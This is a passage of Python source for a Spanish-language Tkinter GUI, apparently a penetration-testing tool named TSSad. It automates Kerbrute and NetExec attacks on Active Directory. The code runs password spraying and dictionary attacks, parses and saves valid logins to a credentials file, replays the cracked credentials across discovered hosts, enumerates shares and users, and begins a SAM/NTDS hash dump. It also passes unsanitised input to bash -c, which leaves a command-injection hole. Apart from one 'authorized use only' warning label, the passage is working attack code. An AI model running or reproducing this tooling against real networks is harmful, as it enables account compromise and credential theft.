        metasploit_btn.pack(side=tk.LEFT, padx=10)
        
        john_btn = tk.Button(other_buttons, text="🔓 John the Ripper", 
                            command=self.start_john_ripper,
                            bg='#ff6600', fg='white', font=('Arial', 10, 'bold'))
        john_btn.pack(side=tk.LEFT, padx=10)
        
        hashcat_btn = tk.Button(other_buttons, text="⚡ Hashcat", 
                               command=self.start_hashcat,
                               bg='#ffaa00', fg='black', font=('Arial', 10, 'bold'))
        hashcat_btn.pack(side=tk.LEFT, padx=10)
        
        # SECCIÓN 5: Ataques Automatizados
        auto_attack_frame = tk.LabelFrame(frame, text="🤖 Ataques Automatizados", font=('Arial', 10, 'bold'))
        auto_attack_frame.pack(fill=tk.X, padx=10, pady=5)
        
        auto_attack_buttons = tk.Frame(auto_attack_frame)
        auto_attack_buttons.pack(pady=5)
        
        auto_all_btn = tk.Button(auto_attack_buttons, text="⚔️ Ejecutar Todos los Ataques", 
                                command=self.start_all_attacks,
                                bg='#ff3300', fg='white', font=('Arial', 11, 'bold'),
                                height=2)
        auto_all_btn.pack(side=tk.LEFT, padx=10)
        
        auto_spray_btn = tk.Button(auto_attack_buttons, text="💥 Auto Password Spray", 
                                  command=self.auto_password_spray_all,
                                  bg='#ff6600', fg='white', font=('Arial', 11, 'bold'),
                                  height=2)
        auto_spray_btn.pack(side=tk.LEFT, padx=10)
        
        test_found_creds_btn = tk.Button(auto_attack_buttons, text="🔑 Probar Credenciales Encontradas", 
                                        command=self.test_found_credentials,
                                        bg='#ff9900', fg='black', font=('Arial', 11, 'bold'),
                                        height=2)
        test_found_creds_btn.pack(side=tk.LEFT, padx=10)
        
        # Advertencia final
        warning_text = """⚠️ ADVERTENCIA: Estas herramientas pueden causar daños. Úsalas SOLO en entornos autorizados. ⚠️"""
        warning_label = tk.Label(frame, text=warning_text, font=('Arial', 10, 'bold'), 
                                fg='red', justify=tk.CENTER)
        warning_label.pack(pady=10)
    
    def setup_log_area(self, parent):
        """Configura el área de logs"""
        log_frame = tk.LabelFrame(parent, text="Logs y Resultados", font=('Arial', 10, 'bold'))
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, 
                                                 bg='black', fg='#00ff00', 
                                                 font=('Courier', 9))
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.log("TSSad (by jukathaido) iniciada - USO ÉTICO ÚNICAMENTE")
        self.log("="*60)
    
    def load_saved_data(self):
        """Carga datos guardados de sesiones anteriores"""
        # Cargar hosts descubiertos
        if os.path.exists(self.hosts_file):
            try:
                with open(self.hosts_file, 'r') as f:
                    self.discovered_hosts = [line.strip() for line in f if line.strip()]
                self.update_hosts_file_status(True)
                self.log(f"📂 Cargados {len(self.discovered_hosts)} hosts desde sesión anterior")
            except Exception as e:
                self.log(f"⚠️ Error cargando hosts: {str(e)}")
        
        # Cargar usuarios válidos
        if os.path.exists(self.valid_users_file):
            try:
                with open(self.valid_users_file, 'r') as f:
                    self.valid_users = [line.strip() for line in f if line.strip()]
                self.update_valid_users_status(True)
                self.log(f"👥 Cargados {len(self.valid_users)} usuarios válidos desde sesión anterior")
            except Exception as e:
                self.log(f"⚠️ Error cargando usuarios: {str(e)}")
        
        # Actualizar estado en pestaña de ataques si existe
        self.root.after(2000, self.update_attack_status)
    
    def save_valid_users(self, users):
        """Guarda la lista de usuarios válidos en un archivo (reemplaza contenido completo)"""
        try:
            # Combinar con usuarios existentes para evitar duplicados
            all_users = list(self.valid_users) if hasattr(self, 'valid_users') and self.valid_users else []
            
            for user in users:
                if user not in all_users:
                    all_users.append(user)
            
            # Guardar todos los usuarios únicos
            with open(self.valid_users_file, 'w') as f:
                for user in all_users:
                    f.write(f"{user}\n")
            
            self.valid_users = all_users
            self.update_valid_users_status(True)
            self.log(f"👥 Usuarios válidos guardados en {self.valid_users_file}:")
            for user in all_users[:10]:  # Mostrar solo los primeros 10
                self.log(f"  -> {user}")
            if len(all_users) > 10:
                self.log(f"  ... y {len(all_users) - 10} más")
                
        except Exception as e:
            self.log(f"❌ Error guardando usuarios: {str(e)}")
    
    def update_valid_users_status(self, exists):
        """Actualiza el estado de usuarios válidos en la interfaz"""
        if exists and hasattr(self, 'valid_users_status'):
            self.valid_users_status.config(
                text=f"Usuarios válidos: {self.valid_users_file} ({len(self.valid_users)} usuarios)", 
                fg='green'
            )
        elif hasattr(self, 'valid_users_status'):
            self.valid_users_status.config(text="Usuarios válidos: No encontrados", fg='red')
    
    def view_valid_users(self):
        """Muestra los usuarios válidos encontrados en una ventana"""
        if not self.valid_users:
            messagebox.showinfo("Usuarios Válidos", "No hay usuarios válidos encontrados aún.\nEjecuta primero Kerbrute para enumeración de usuarios.")
            return
        
        # Crear ventana para mostrar usuarios
        users_window = tk.Toplevel(self.root)
        users_window.title("Usuarios Válidos Encontrados")
        users_window.geometry("400x500")
        users_window.configure(bg='#2b2b2b')
        
        # Título
        title_label = tk.Label(users_window, text=f"Usuarios Válidos ({len(self.valid_users)})", 
                              font=('Arial', 12, 'bold'), fg='#00ff00', bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Lista de usuarios
        users_text = scrolledtext.ScrolledText(users_window, height=20, width=50,
                                              bg='black', fg='#00ff00', font=('Courier', 10))
        users_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        for i, user in enumerate(self.valid_users, 1):
            users_text.insert(tk.END, f"{i:2d}. {user}\n")
        
        users_text.config(state=tk.DISABLED)
        
        # Botón cerrar
        close_btn = tk.Button(users_window, text="Cerrar", command=users_window.destroy,
                             bg='#ff3333', fg='white', font=('Arial', 10, 'bold'))
        close_btn.pack(pady=10)
    
    def update_attack_status(self):
        """Actualiza el estado de datos disponibles para ataques"""
        if not hasattr(self, 'attack_hosts_status'):
            return
        
        # Estado de hosts
        if self.discovered_hosts:
            self.attack_hosts_status.config(
                text=f"Hosts vivos: {len(self.discovered_hosts)} disponibles", 
                fg='green'
            )
        else:
            self.attack_hosts_status.config(text="Hosts vivos: No disponibles", fg='red')
        
        # Estado de usuarios
        if self.valid_users:
            self.attack_users_status.config(
                text=f"Usuarios válidos: {len(self.valid_users)} disponibles", 
                fg='green'
            )
        else:
            self.attack_users_status.config(text="Usuarios válidos: No disponibles", fg='red')
        
        # Estado de dominio
        domain = self.domain_entry.get().strip() if hasattr(self, 'domain_entry') else ""
        if domain:
            self.attack_domain_status.config(
                text=f"Dominio configurado: {domain}", 
                fg='green'
            )
        else:
            self.attack_domain_status.config(text="Dominio configurado: No", fg='red')
    
    def start_password_spray(self):
        """Inicia ataque de password spray con Kerbrute"""
        if not self.valid_users or not os.path.exists(self.valid_users_file):
            messagebox.showerror("Error", "No hay usuarios válidos disponibles.\nEjecuta primero Kerbrute para enumeración de usuarios.")
            return
        
        domain = self.domain_entry.get().strip() if hasattr(self, 'domain_entry') else ""
        if not domain:
            messagebox.showerror("Error", "Configura el dominio en la pestaña 1.4 Análisis AD")
            return
        
        password = self.password_entry.get().strip()
        if not password:
            messagebox.showerror("Error", "Introduce una contraseña para el password spray")
            return
        
        # Verificar si kerbrute existe
        if not os.path.exists(self.kerbrute_path):
            messagebox.showerror("Error", f"Kerbrute no encontrado en:\n{self.kerbrute_path}")
            return
        
        # Obtener DC si está disponible
        dc = self.dc_entry.get().strip() if hasattr(self, 'dc_entry') else ""
        dc_param = f"--dc {dc}" if dc else ""
        
        # Comando para password spray usando archivo de usuarios válidos guardado
        cmd = ["bash", "-c", f"cd /home/kali/Aplicaciones/TSSad/kerbrute/dist && ./kerbrute_linux_amd64 passwordspray -d {domain} {dc_param} {os.path.abspath(self.valid_users_file)} {password}"]
        
        self.log(f"💥 INICIANDO PASSWORD SPRAY:")
        self.log(f"   Dominio: {domain}")
        self.log(f"   DC: {dc if dc else 'Auto-detectar'}")
        self.log(f"   Usuarios: {len(self.valid_users)} (desde {self.valid_users_file})")
        self.log(f"   Contraseña: {'*' * len(password)}")
        
        # Ejecutar con procesamiento en tiempo real para capturar credenciales válidas
        self.run_kerbrute_attack_with_realtime_results(cmd, "Password Spray")
    
    def run_kerbrute_attack_with_realtime_results(self, cmd, scan_type):
        """Ejecuta ataques de Kerbrute y captura credenciales válidas en tiempo real"""
        def run():
            found_credentials = []
            try:
                self.log(f"🚀 INICIANDO: {scan_type}")
                self.log(f"Comando: {' '.join(cmd)}")
                self.log("-" * 50)
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                         stderr=subprocess.STDOUT, text=True, 
                                         universal_newlines=True, bufsize=1)
                self.running_processes.append(process)
                
                # Procesar output línea por línea en tiempo real
                while True:
                    line = process.stdout.readline()
                    if line:
                        line = line.rstrip()
                        # Mostrar en tiempo real (sin limpiar para ver colores)
                        self.log(f"  {line}")
                        
                        # Buscar credenciales válidas y limpiar códigos ANSI
                        if "[+] VALID LOGIN:" in line:
                            # Extraer credenciales y limpiar códigos de escape ANSI
                            parts = line.split("[+] VALID LOGIN:")
                            if len(parts) > 1:
                                credential = parts[1].strip()
                                # Limpiar códigos de escape ANSI
                                credential = self.clean_ansi_codes(credential)
                                found_credentials.append(credential)
                                self.log(f"🎯 ¡CREDENCIAL VÁLIDA ENCONTRADA!: {credential}")
                                
                                # Guardar inmediatamente en archivo de credenciales
                                self.save_valid_credential(credential)
                        
                        # También capturar errores o información importante
                        elif "[!]" in line or "ERROR" in line:
                            self.log(f"⚠️  {line}")
                    
                    # Verificar si el proceso ha terminado
                    if process.poll() is not None:
                        break
                
                # Leer cualquier output restante
                remaining_output = process.stdout.read()
                if remaining_output:
                    for line in remaining_output.split('\n'):
                        if line.strip():
                            self.log(f"  {line.strip()}")
                            if "[+] VALID LOGIN:" in line:
                                parts = line.split("[+] VALID LOGIN:")
                                if len(parts) > 1:
                                    credential = parts[1].strip()
                                    # Limpiar códigos ANSI también aquí
                                    credential = self.clean_ansi_codes(credential)
                                    if credential not in found_credentials:
                                        found_credentials.append(credential)
                                        self.log(f"🎯 ¡CREDENCIAL VÁLIDA ENCONTRADA!: {credential}")
                                        self.save_valid_credential(credential)
                
                return_code = process.returncode
                
                self.log("-" * 50)
                if return_code == 0:
                    self.log(f"✅ COMPLETADO: {scan_type}")
                    self.show_completion_notification(scan_type, True)
                else:
                    self.log(f"⚠️ PROCESO FINALIZADO: {scan_type} (código: {return_code})")
                
                if found_credentials:
                    self.log(f"🎉 RESUMEN: {len(found_credentials)} credenciales válidas encontradas!")
                    self.log("📄 Credenciales guardadas en: valid_credentials.txt")
                    self.scan_results[scan_type] = f"Credenciales encontradas: {', '.join(found_credentials)}"
                else:
                    self.log("❌ No se encontraron credenciales válidas")
                        
            except Exception as e:
                self.log(f"💥 EXCEPCIÓN en {scan_type}: {str(e)}")
                if found_credentials:
                    self.log(f"💾 Se conservaron {len(found_credentials)} credenciales encontradas")
                self.show_completion_notification(scan_type, False, str(e))
            finally:
                if process in self.running_processes:
                    self.running_processes.remove(process)
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    def clean_ansi_codes(self, text):
        """Limpia códigos de escape ANSI de una cadena de texto"""
        # Patrones para códigos de escape ANSI
        ansi_patterns = [
            r'\033\[[0-9;]*m',  # Códigos estándar como \033[0m, \033[31m, etc.
            r'\x1b\[[0-9;]*m',  # Variante con \x1b
            r'\[0m',            # Solo el código de reset sin escape
            r'\[[0-9;]*m',      # Códigos sin \033 o \x1b
        ]
        
        cleaned_text = text
        for pattern in ansi_patterns:
            cleaned_text = re.sub(pattern, '', cleaned_text)
        
        # Limpiar espacios extra que puedan quedar
        cleaned_text = ' '.join(cleaned_text.split())
        
        return cleaned_text
    
    def save_valid_credential(self, credential):
        """Guarda una credencial válida en archivo de credenciales"""
        credentials_file = "valid_credentials.txt"
        try:
            # Limpiar códigos ANSI antes de guardar
            credential = self.clean_ansi_codes(credential)
            
            # Leer credenciales existentes para evitar duplicados
            existing_creds = []
            if os.path.exists(credentials_file):
                with open(credentials_file, 'r') as f:
                    existing_creds = [line.strip() for line in f if line.strip()]
            
            # Solo añadir si no existe ya
            if credential not in existing_creds:
                with open(credentials_file, 'a') as f:
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] {credential}\n")
                self.log(f"💾 Credencial guardada: {credential}")
                
        except Exception as e:
            self.log(f"❌ Error guardando credencial: {str(e)}")

    def start_dictionary_attack(self):
        """Inicia ataque por diccionario contra un usuario específico"""
        target_user = self.target_user_entry.get().strip()
        if not target_user:
            messagebox.showerror("Error", "Introduce un usuario objetivo para el ataque")
            return
        
        domain = self.domain_entry.get().strip() if hasattr(self, 'domain_entry') else ""
        if not domain:
            messagebox.showerror("Error", "Configura el dominio en la pestaña 1.4 Análisis AD")
            return
        
        # Verificar si kerbrute existe
        if not os.path.exists(self.kerbrute_path):
            messagebox.showerror("Error", f"Kerbrute no encontrado en:\n{self.kerbrute_path}")
            return
        
        # Pedir archivo de diccionario de contraseñas
        password_file = filedialog.askopenfilename(
            title="Selecciona diccionario de contraseñas",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not password_file:
            return
        
        # Obtener DC si está disponible
        dc = self.dc_entry.get().strip() if hasattr(self, 'dc_entry') else ""
        dc_param = f"--dc {dc}" if dc else ""
        
        # Comando para ataque por diccionario (bruteuser)
        cmd = ["bash", "-c", f"cd /home/kali/Aplicaciones/TSSad/kerbrute/dist && ./kerbrute_linux_amd64 bruteuser -d {domain} {dc_param} {password_file} {target_user}"]
        
        self.log(f"🎯 INICIANDO ATAQUE POR DICCIONARIO:")
        self.log(f"   Dominio: {domain}")
        self.log(f"   DC: {dc if dc else 'Auto-detectar'}")
        self.log(f"   Usuario objetivo: {target_user}")
        self.log(f"   Diccionario: {os.path.basename(password_file)}")
        
        # Ejecutar con procesamiento en tiempo real para capturar credenciales
        self.run_kerbrute_attack_with_realtime_results(cmd, "Ataque por Diccionario")
    
    def view_discovered_vulnerabilities(self):
        """Muestra las vulnerabilidades encontradas en una ventana"""
        vulnerabilities_file = "discovered_vulnerabilities.txt"
        
        if not os.path.exists(vulnerabilities_file):
            messagebox.showinfo("Vulnerabilidades", "No se han encontrado vulnerabilidades aún.\nEjecuta primero un escaneo de vulnerabilidades.")
            return
        
        # Crear ventana para mostrar vulnerabilidades
        vulns_window = tk.Toplevel(self.root)
        vulns_window.title("Vulnerabilidades Encontradas")
        vulns_window.geometry("800x600")
        vulns_window.configure(bg='#2b2b2b')
        
        # Título
        title_label = tk.Label(vulns_window, text="🛡️ Vulnerabilidades Encontradas", 
                              font=('Arial', 14, 'bold'), fg='#ff6600', bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Área de texto con vulnerabilidades
        vulns_text = scrolledtext.ScrolledText(vulns_window, height=30, width=100,
                                              bg='black', fg='#ff6600', font=('Courier', 9))
        vulns_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        try:
            with open(vulnerabilities_file, 'r', encoding='utf-8') as f:
                content = f.read()
                vulns_text.insert(tk.END, content)
        except Exception as e:
            vulns_text.insert(tk.END, f"Error leyendo archivo de vulnerabilidades: {str(e)}")
        
        vulns_text.config(state=tk.DISABLED)
        
        # Botones
        button_frame = tk.Frame(vulns_window, bg='#2b2b2b')
        button_frame.pack(pady=10)
        
        # Botón exportar
        export_btn = tk.Button(button_frame, text="Exportar Vulnerabilidades", 
                              command=lambda: self.export_vulnerabilities(vulnerabilities_file),
                              bg='#00ff00', fg='black', font=('Arial', 10, 'bold'))
        export_btn.pack(side=tk.LEFT, padx=10)
        
        # Botón cerrar
        close_btn = tk.Button(button_frame, text="Cerrar", command=vulns_window.destroy,
                             bg='#ff3333', fg='white', font=('Arial', 10, 'bold'))
        close_btn.pack(side=tk.LEFT, padx=10)
    
    def export_vulnerabilities(self, source_file):
        """Exporta vulnerabilidades a un archivo seleccionado"""
        try:
            export_file = filedialog.asksaveasfilename(
                title="Exportar Vulnerabilidades",
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            if export_file:
                with open(source_file, 'r', encoding='utf-8') as src:
                    content = src.read()
                
                with open(export_file, 'w', encoding='utf-8') as dst:
                    dst.write(f"TSSad (by jukathaido) - Vulnerabilidades Exportadas\n")
                    dst.write(f"Fecha de exportación: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    dst.write("="*60 + "\n\n")
                    dst.write(content)
                
                messagebox.showinfo("Exportación", f"Vulnerabilidades exportadas a:\n{export_file}")
                
        except Exception as e:
            messagebox.showerror("Error", f"Error exportando vulnerabilidades:\n{str(e)}")

    def save_targets_file(self):
        """Guarda los hosts vivos en archivo de objetivos para reutilización"""
        if not self.discovered_hosts:
            return
        
        try:
            with open(self.targets_file, 'w') as f:
                for host in self.discovered_hosts:
                    f.write(f"{host}\n")
            
            self.log(f"🎯 Objetivos guardados en {self.targets_file} para reutilización")
            
        except Exception as e:
            self.log(f"❌ Error guardando objetivos: {str(e)}")
    
    # ===== MÉTODOS NETEXEC =====
    
    def netexec_password_spray(self):
        """NetExec Password Spray contra todos los hosts"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        password = self.netexec_password.get().strip()
        
        if not password:
            messagebox.showerror("Error", "Introduce una contraseña")
            return
        
        if not self.valid_users:
            messagebox.showerror("Error", "No hay usuarios válidos disponibles")
            return
        
        self.log(f"💥 NETEXEC PASSWORD SPRAY - {protocol.upper()}")
        
        # Usar archivo de hosts como targets - limitar si hay demasiados
        if len(self.discovered_hosts) > 15:
            selected_hosts = self.discovered_hosts[:15]
            self.log(f"⚠️ Limitando a los primeros 15 hosts")
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
            
        cmd = f"netexec {protocol} {hosts_str} -u {self.valid_users_file} -p {password} --continue-on-success"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-PasswordSpray")
    
    def netexec_user_spray(self):
        """NetExec User Spray con contraseña específica"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        password = self.netexec_password.get().strip()
        
        if not password:
            messagebox.showerror("Error", "Introduce una contraseña")
            return
        
        # Pedir archivo de usuarios personalizado
        user_file = filedialog.askopenfilename(
            title="Selecciona archivo de usuarios",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not user_file:
            return
        
        self.log(f"👥 NETEXEC USER SPRAY - {protocol.upper()}")
        
        # Limitar hosts si hay demasiados
        if len(self.discovered_hosts) > 15:
            selected_hosts = self.discovered_hosts[:15]
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
        
        cmd = f"netexec {protocol} {hosts_str} -u {user_file} -p {password} --continue-on-success"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-UserSpray")
    
    def netexec_dictionary_attack(self):
        """NetExec Dictionary Attack"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        user = self.netexec_user.get().strip()
        
        if not user:
            messagebox.showerror("Error", "Introduce un usuario")
            return
        
        # Pedir diccionario de contraseñas
        password_file = filedialog.askopenfilename(
            title="Selecciona diccionario de contraseñas",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not password_file:
            return
        
        self.log(f"📖 NETEXEC DICTIONARY ATTACK - {protocol.upper()}")
        
        # Limitar hosts si hay demasiados
        if len(self.discovered_hosts) > 15:
            selected_hosts = self.discovered_hosts[:15]
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
        
        cmd = f"netexec {protocol} {hosts_str} -u {user} -p {password_file} --continue-on-success"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-Dictionary")
    
    def netexec_test_manual(self):
        """NetExec Test Credentials manuales desde los campos de la interfaz"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        user = self.netexec_user.get().strip()
        password = self.netexec_password.get().strip()
        
        if not user or not password:
            messagebox.showerror("Error", "Introduce usuario y contraseña en los campos correspondientes")
            return
        
        self.log(f"🧪 NETEXEC TEST MANUAL - {protocol.upper()}")
        self.log(f"   Usuario: {user}")
        self.log(f"   Contraseña: {'*' * len(password)}")
        
        # Probar credenciales en todos los hosts (limitar si hay demasiados)
        if len(self.discovered_hosts) > 20:
            selected_hosts = self.discovered_hosts[:20]
            self.log(f"⚠️ Limitando a los primeros 20 hosts para evitar línea de comandos muy larga")
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
            
        cmd = f"netexec {protocol} {hosts_str} -u {user} -p {password} --continue-on-success"
        
        self.log(f"Comando: {cmd}")
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-Manual-{user}")
    
    def netexec_test_credentials(self):
        """NetExec Test Credentials encontradas"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        credentials_file = "valid_credentials.txt"
        if not os.path.exists(credentials_file):
            messagebox.showerror("Error", "No hay credenciales encontradas")
            return
        
        protocol = self.netexec_protocol.get()
        
        self.log(f"🔓 NETEXEC TEST CREDENTIALS - {protocol.upper()}")
        
        # Leer credenciales y formatear para NetExec
        try:
            with open(credentials_file, 'r') as f:
                content = f.read()
                self.log(f"📄 Contenido del archivo de credenciales:")
                self.log(content[:200] + "..." if len(content) > 200 else content)
            
            with open(credentials_file, 'r') as f:
                creds = []
                line_count = 0
                for line in f:
                    line_count += 1
                    line = line.strip()
                    if not line:
                        continue
                    
                    self.log(f"🔍 Procesando línea {line_count}: {line}")
                    
                    # Buscar patrones de credenciales
                    credential_part = ""
                    
                    # Formato: [timestamp] usuario:contraseña
                    if line.startswith('[') and ']' in line:
                        # Extraer la parte después del timestamp
                        bracket_end = line.find(']')
                        if bracket_end != -1:
                            credential_part = line[bracket_end + 1:].strip()
                    else:
                        # Formato directo: usuario:contraseña
                        credential_part = line
                    
                    # Verificar si tiene formato usuario:contraseña
                    if ':' in credential_part and len(credential_part.split(':')) >= 2:
                        parts = credential_part.split(':', 1)  # Split solo en el primer :
                        user = parts[0].strip()
                        password = parts[1].strip()
                        
                        if user and password:
                            creds.append(f"{user}:{password}")
                            self.log(f"✅ Credencial extraída: {user}:{'*' * len(password)}")
                        else:
                            self.log(f"⚠️ Credencial vacía en línea: {line}")
                    else:
                        self.log(f"⚠️ Formato inválido en línea: {line}")
            
            if not creds:
                self.log("❌ No se encontraron credenciales válidas en el archivo")
                messagebox.showerror("Error", "No se encontraron credenciales válidas en el archivo.\nVerifica el formato: usuario:contraseña")
                return
            
            self.log(f"📊 Total de credenciales encontradas: {len(creds)}")
            
            # Crear archivos temporales separados para usuarios y contraseñas
            temp_users_file = "temp_netexec_users.txt"
            temp_passwords_file = "temp_netexec_passwords.txt"
            
            users = []
            passwords = []
            
            for cred in creds:
                user, password = cred.split(':', 1)
                if user not in users:
                    users.append(user)
                if password not in passwords:
                    passwords.append(password)
            
            # Escribir archivos temporales
            with open(temp_users_file, 'w') as f:
                for user in users:
                    f.write(f"{user}\n")
            
            with open(temp_passwords_file, 'w') as f:
                for password in passwords:
                    f.write(f"{password}\n")
            
            self.log(f"📝 Archivos temporales creados:")
            self.log(f"   Usuarios: {temp_users_file} ({len(users)} usuarios)")
            self.log(f"   Contraseñas: {temp_passwords_file} ({len(passwords)} contraseñas)")
            
            # Comando NetExec correcto - limitar hosts si hay demasiados
            if len(self.discovered_hosts) > 10:
                selected_hosts = self.discovered_hosts[:10]
                self.log(f"⚠️ Limitando a los primeros 10 hosts para evitar línea de comandos muy larga")
                hosts_str = ' '.join(selected_hosts)
            else:
                hosts_str = ' '.join(self.discovered_hosts)
                
            cmd = f"netexec {protocol} {hosts_str} -u {temp_users_file} -p {temp_passwords_file} --continue-on-success"
            
            self.log(f"🚀 Ejecutando: {cmd}")
            
            terminal_cmd = self.get_terminal_command(cmd)
            self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-TestCreds")
            
        except Exception as e:
            self.log(f"❌ Error procesando credenciales: {str(e)}")
            messagebox.showerror("Error", f"Error procesando credenciales: {str(e)}")
    
    def netexec_test_credentials_individual(self):
        """NetExec Test Credentials una por una (más compatible)"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        credentials_file = "valid_credentials.txt"
        if not os.path.exists(credentials_file):
            messagebox.showerror("Error", "No hay credenciales encontradas")
            return
        
        protocol = self.netexec_protocol.get()
        
        self.log(f"🎯 NETEXEC TEST CREDENTIALS INDIVIDUAL - {protocol.upper()}")
        
        # Leer y parsear credenciales
        try:
            with open(credentials_file, 'r') as f:
                creds = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    # Buscar credenciales en formato [timestamp] usuario:contraseña
                    credential_part = ""
                    if line.startswith('[') and ']' in line:
                        bracket_end = line.find(']')
                        if bracket_end != -1:
                            credential_part = line[bracket_end + 1:].strip()
                    else:
                        credential_part = line
                    
                    if ':' in credential_part and len(credential_part.split(':')) >= 2:
                        parts = credential_part.split(':', 1)
                        user = parts[0].strip()
                        password = parts[1].strip()
                        
                        if user and password:
                            creds.append((user, password))
            
            if not creds:
                messagebox.showerror("Error", "No se encontraron credenciales válidas")
                return
                
            self.log(f"📊 Probando {len(creds)} credenciales individualmente...")
            
            # Probar cada credencial individualmente
            def test_individual_creds():
                for i, (user, password) in enumerate(creds, 1):
                    self.log(f"🔍 Probando credencial {i}/{len(creds)}: {user}:{'*' * len(password)}")
                    
                    # Probar en un host primero
                    test_host = self.discovered_hosts[0]
                    cmd = f"netexec {protocol} {test_host} -u {user} -p {password}"
                    
                    self.log(f"   Comando: {cmd}")
                    
                    try:
                        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)
                        
                        if "[+]" in result.stdout or "STATUS_SUCCESS" in result.stdout:
                            self.log(f"✅ ¡CREDENCIAL VÁLIDA!: {user}:{password}")
                            
                            # Si funciona en un host, probar en todos
                            hosts_str = ' '.join(self.discovered_hosts)
                            cmd_all = f"netexec {protocol} {hosts_str} -u {user} -p {password} --continue-on-success"
                            
                            terminal_cmd = self.get_terminal_command(cmd_all)
                            self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-Valid-{user}")
                        else:
                            self.log(f"❌ Credencial inválida: {user}")
                            
                    except subprocess.TimeoutExpired:
                        self.log(f"⏳ Timeout probando: {user}")
                    except Exception as e:
                        self.log(f"❌ Error probando {user}: {str(e)}")
                    
                    # Pequeña pausa entre intentos
                    time.sleep(1)
                
                self.log("🏁 Prueba individual de credenciales completada")
            
            # Ejecutar en hilo separado
            thread = threading.Thread(target=test_individual_creds, daemon=True)
            thread.start()
            
        except Exception as e:
            self.log(f"❌ Error procesando credenciales: {str(e)}")
            messagebox.showerror("Error", f"Error procesando credenciales: {str(e)}")
    
    def netexec_enumerate(self):
        """NetExec Enumerate Resources"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        user = self.netexec_user.get().strip()
        password = self.netexec_password.get().strip()
        
        if not user or not password:
            messagebox.showerror("Error", "Introduce usuario y contraseña")
            return
        
        self.log(f"🔍 NETEXEC ENUMERATE - {protocol.upper()}")
        
        # Limitar hosts si hay demasiados
        if len(self.discovered_hosts) > 10:
            selected_hosts = self.discovered_hosts[:10]
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
        
        cmd = f"netexec {protocol} {hosts_str} -u {user} -p {password} --users --groups --shares --pass-pol"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-Enumerate")
    
    def netexec_list_shares(self):
        """NetExec List Shares"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        user = self.netexec_user.get().strip()
        password = self.netexec_password.get().strip()
        
        self.log(f"📂 NETEXEC LIST SHARES - {protocol.upper()}")
        
        # Limitar hosts si hay demasiados
        if len(self.discovered_hosts) > 15:
            selected_hosts = self.discovered_hosts[:15]
            hosts_str = ' '.join(selected_hosts)
        else:
            hosts_str = ' '.join(self.discovered_hosts)
        
        if user and password:
            cmd = f"netexec {protocol} {hosts_str} -u {user} -p {password} --shares"
        else:
            cmd = f"netexec {protocol} {hosts_str} --shares"
        
        terminal_cmd = self.get_terminal_command(cmd)
        self.run_command_in_thread(terminal_cmd, f"NetExec-{protocol}-Shares")
    
    def netexec_dump_secrets(self):
        """NetExec Dump SAM/NTDS"""
        if not self.discovered_hosts:
            messagebox.showerror("Error", "No hay hosts disponibles")
            return
        
        protocol = self.netexec_protocol.get()
        user = self.netexec_user.get().strip()
        password = self.netexec_password.get().strip()
        
        if not user or not password:
            messagebox.showerror("Error", "Introduce credenciales de administrador")
            return
        
        # Confirmación de seguridad
        if not messagebox.askyesno("Confirmación", "⚠️ Esta acción intentará dumpear hashes del sistema.\n¿Estás seguro de continuar?"):
            return
        
        self.log(f"💾 NETEXEC DUMP SECRETS - {protocol.upper()}")
        
        # Para dump secrets, usar menos hosts por seguridad
        if len(self.discovered_hosts) > 5:
            selected_hosts = self.discovered_hosts[:5]
